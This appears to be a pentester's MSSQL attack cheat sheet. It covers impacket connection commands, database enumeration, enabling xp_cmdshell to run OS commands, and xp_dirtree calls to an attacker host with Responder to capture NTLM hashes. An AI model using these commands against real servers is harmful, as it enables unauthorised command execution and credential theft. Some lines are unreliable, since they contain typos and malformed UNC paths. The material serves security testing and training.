
## Good places and tools

[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) - ultimate cheatsheet

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is A PowerShell Toolkit for Attacking SQL Server
[PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) has its own handy cheatsheet.


## Warning

Be careful, you can **block accounts** if you fail login several times using an existing username.

## Impacket smb related scripts

[[Impacket-Cheatsheet]]; if you have credentials:
```bash
# Connect to a Microsoft SQL server
impacket-mssqlclient -port $PORT $domain/$sql_svc 
# As a user with Windows Authenciation
impacket-mssqlclient $user:$hostname@$IP -windows-auth
# Specify a database instance
-db $database_instance
# If to are targeting a DC 
-dc-ip 
# Do prompt for password
-no-pass
```

Basic Queries
```sql
SELECT @@version					 	-- version check
SELECT DB_NAME()						-- current database
SELECT name FROM master..sysdatabases;	-- list databases

SELECT name, database_id, create_date FROM sys.databases;

USE <databasenamegoeshere>;
SELECT * FROM information_schema.tables;
SELECT * FROM users;

-- Has two comment types
SELECT 1 — comment  
SELECT /*comment*/ 

SELECT is_srvrolemember('sysadmin'); 	-- role check

```

Show all the tables in a database
```sql
SELECT table_name, table_schema, table_type
    FROM information_schema.tables
    WHERE table_catalog = 'TestDB'
    ORDER BY table_name ASC;
```

Show all tables across all databases
```sql
SELECT *
    FROM information_schema.tables
    ORDER BY table_name ASC;
```


## Command Execution

Check if [xp_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)  is already active or enabled it [server configuration option: xp_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15)
```sql   
EXEC xp_cmdshell 'net user'; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; -- priv  
RECONFIGURE; -- priv  
EXEC sp_configure 'xp_cmdshell', 1; -- priv  
RECONFIGURE; -- priv
-- OR
EXEC mast.dbo.xp_cmdshell 'cmd';
-- OR on later versions EXECUTE not EXEC:
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'net user';
```

Arbituary File Reading with xp_dirtree
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test'; EXEC xp_dirtree @q;--+ 
```
Or
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test';exec master.dbo.xp_dirtree @q;--+
```

## Hash Passback

Use [[Responder-Cheatsheet]] to catch the service hash of user 
```bash
sudo responder -I $interface
xp_dirtree "\\attacker_ip\Share"
```

## References

[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
[therootcompany](https://therootcompany.com/blog/mssql-cheat-sheet/)
[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 
[PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
[xp_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)  